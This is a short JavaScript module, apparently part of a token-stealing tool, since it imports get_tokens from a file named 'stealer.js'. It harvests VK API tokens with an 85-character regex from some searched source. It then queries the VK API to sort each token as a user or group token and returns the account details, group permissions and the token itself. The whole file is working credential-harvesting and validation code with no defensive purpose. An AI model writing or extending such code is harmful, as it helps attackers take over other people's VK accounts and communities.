const { VK } = require("vk-io");
const { get_tokens } = require("./stealer.js");
const vk = new VK({});

async function vk_checker_user(vktoken) {
    let base = vk.api.users.get({
        access_token: vktoken,
        fields: "photo_max_orig"
    });
    return base;
};

async function vk_checker_group(vktoken) {
    let base = vk.api.groups.getById({
        access_token: vktoken
    });

    let perms = vk.api.groups.getTokenPermissions({
        access_token: vktoken
    });

    let info = Promise.all([base, perms]);
    return info;
};

async function vk_checker() {
    let tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
    let promises = tokens.map(async function (token) {
        try {
            let account = await vk_checker_user(token);
            if (account.length > 0) {
                let result = {account: account[0]}
                result.token = token;
                result.type = "user";
                return result;
            } else {
                let account = await vk_checker_group(token);
                let result = {account: account[0][0], perms: account[1]}
                result.token = token;
                result.type = "group";
                return result;
            };
        } catch (error) {
            console.log(error)
        };
    });
    let result = await Promise.all(promises);
    return result.filter(n => n);
};

module.exports = { vk_checker };